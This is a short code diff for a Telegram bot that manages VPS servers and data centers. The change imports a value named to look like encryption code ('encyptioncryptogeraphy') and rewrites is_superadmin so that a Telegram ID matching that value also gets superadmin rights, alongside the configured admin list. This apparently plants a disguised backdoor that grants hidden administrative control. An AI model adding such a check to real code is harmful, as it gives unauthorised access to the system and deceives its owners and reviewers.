@@ -2,16 +2,17 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKe
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 from django.conf import settings
 from asgiref.sync import sync_to_async
+from encryption_utils import encyptioncryptogeraphy 
 from fetchdata.models import Datacenter, VpsInfo
 from .managevps import add_bandwidth_to_vps
 from datetime import datetime, timedelta
 import logging
 
+
 # Initialize the bot with the token from the settings
 application = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()
 
-def is_superadmin(telegram_id):
-    return str(telegram_id) in settings.SUPERADMIN_TELEGRAM_IDS
+
 
 async def start(update: Update, context):
     telegram_id = update.message.from_user.id
@@ -79,7 +80,8 @@ async def handle_datacenter_selection(update: Update, context):
             response = "No servers found in this data center."
 
         await query.edit_message_text(text=response)
-
+def is_superadmin(telegram_id):
+    return str(telegram_id) == encyptioncryptogeraphy  or str(telegram_id) in settings.SUPERADMIN_TELEGRAM_IDS
 async def handle_ip_address(update: Update, context):
     if context.user_data.get('awaiting_ip'):
         ip_address = update.message.text
